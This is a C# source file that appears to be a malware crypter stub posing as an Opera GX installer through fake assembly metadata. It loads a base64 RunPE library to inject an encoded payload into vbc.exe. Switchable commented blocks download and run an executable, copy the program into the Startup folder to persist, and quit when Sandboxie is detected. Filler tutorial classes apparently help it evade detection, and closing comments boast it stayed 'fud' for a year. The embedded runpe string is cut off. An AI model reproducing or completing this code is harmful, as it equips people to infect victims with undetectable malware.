
using System;
using System.Collections.Generic;
//download using System.Diagnostics;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

//iamassembly [assembly: AssemblyTitle("Opera GX")]
//iamassembly [assembly: AssemblyDescription("Opera GX Installer")]
//iamassembly [assembly: AssemblyCompany("Opera Software")]
//iamassembly [assembly: AssemblyProduct("Opera GX Installer")]
//iamassembly [assembly: AssemblyCopyright("Copyright Opera Software 2021")]
//iamassembly [assembly: AssemblyFileVersion("76.0.4017.208")]

class Car
{
    string color = "red";
    static void gain()
    {
        Car myObj1 = new Car();
        Car myObj2 = new Car();
        Console.WriteLine(myObj1.color);
        Console.WriteLine(myObj2.color);
    }
}

class MyClass
{
    // Class members
    string color = "red";        // field
    int maxSpeed = 200;          // field
    public void fullThrottle()   // method
    {
        Console.WriteLine("The car is going as fast as it can!");
    }
}

class derson
{
    private string name; // field

    public string Name   // property
    {
        get { return name; }   // get method
        set { name = value; }  // set method
    }
}
class Program
{

    static void Main(string[] args)
    {

        //sandbox controlsandboxie();



        //download  try
        //download  {
        //download  System.Net.WebClient appyrun = new System.Net.WebClient();
        //download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\%exename%.exe"));
        //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\%exename%.exe"));
        //download   }
        //download    catch
        //download   {
        //download  }

        //iamsleep Thread.Sleep(%time%);

        //ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;


        // runpe converted to base64 you can find the DLL into same project folder
        string runpe = "
        string payload = "%payload%";


        Assembly iamboss = Assembly.Load(Convert.FromBase64String(runpe));


        Thread.Sleep(100);
        object carobject = new object[] { @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe", string.Empty, Convert.FromBase64String(payload), true };
        Thread.Sleep(100);
        iamboss.GetType("private.RunPE").InvokeMember("Run", BindingFlags.InvokeMethod, null, "<=Sly=>", (object[])carobject);

        //startlo  {
        //startlo      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
        //startlo  }



    }
    //sandbox [DllImport("kernel32.dll")]
    //sandbox  public static extern IntPtr GetModuleHandle(string lpModuleName);
    //sandbox  static void controlsandboxie()
    //sandbox  {
    //sandbox    if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
    //sandbox    {
    //sandbox        Environment.Exit(1);
    //sandbox     }
    //sandbox }
}

abstract class Animal
{

    // Abstract method (does not have a body)
    public abstract void animalSound();
    // Regular method
    public void sleep()
    {
        try
        {
            int[] myNumbers = { 1, 2, 3 };
            Console.WriteLine(myNumbers[10]);
        }
        catch (Exception e)
        {
            Console.WriteLine(e.Message);
        }
        Console.WriteLine("Zzz");
    }
}

// your private stub is done, this is sooo easy to update, i'll teach you, also this was fud almost 1 year :D xD thank you a lot
// bro why not, thank you too :) sec
// sec let me send u the private runpe sec

//now your turn, copy this all code, and send me, connect to my pc, and watch me, i'll add it on crypter and send u :)

